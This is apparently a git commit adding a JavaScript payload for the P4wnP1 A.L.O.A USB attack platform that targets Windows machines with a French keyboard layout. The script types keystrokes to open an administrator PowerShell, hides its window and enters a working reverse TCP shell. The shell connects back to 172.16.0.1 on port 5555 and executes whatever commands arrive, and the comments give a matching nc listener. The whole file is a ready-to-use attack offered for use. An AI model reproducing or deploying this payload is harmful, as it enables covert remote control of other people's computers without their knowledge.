87a2990c9621d74feb385ec38bcac4c17f68dbc0
DuckyTools <47247782+DuckyTools@users.noreply.github.com>
2019-05-31 19:01:46 +0200

    Add files via upload

---
+++ reverse-tcp-hiden-powershell-fr.js
@@ -0,0 +1,45 @@
+// simple windows powershell reverse tcp with P4wnP1 A.L.O.A
+// the windows powershell window will be hidden, look task manager to stop the connection
+//
+// listener with nc : nc -lvp 5555
+//
+// config ip & port : line 23
+
+// LAYOUT FR !
+
+layout('fr');			// FR keyboard layout
+
+typingSpeed(0,0)        // FAST typingSpeed
+press("GUI r")			
+delay(400)				
+type("powershell")			
+press("CTRL SHIFT ENTER")	// run as administrator
+delay(1500)			
+press("SHIFT TAB")		
+press("ENTER")			
+delay(3000)
+
+
+type("PowerShell.exe -windowstyle hidden { \n") // hide windows powershell
+
+type("$client = [System.Net.Sockets.TCPClient]::new('172.16.0.1', 5555)\n") // IP lan P4wnP1 : 172.16.0.1; PORT used : 5555
+type("[byte[]]$bytes = (0..65535).ForEach{ 0 }\n")
+
+type("$stream = $client.GetStream()\n")
+type("while ($i = $stream.Read($bytes, 0, $bytes.Length)) {\n")
+type("    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)\n")
+type("    $sendback = (Invoke-Expression -Command $data 2>&1 ")
+
+layout('us')
+press("RIGHT_ALT 6") // pipeline
+
+layout('fr')
+
+type(" Out-String)\n")
+type("    $prompt = $sendback + 'PS ' + $PWD.Path + '> '\n")
+type("    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt)\n")
+type("    $stream.Write($sendbyte, 0, $sendbyte.Length)\n")
+type("    $stream.Flush()\n")
+type("}\n")
+type("$client.Close()\n")
+type("}\n")
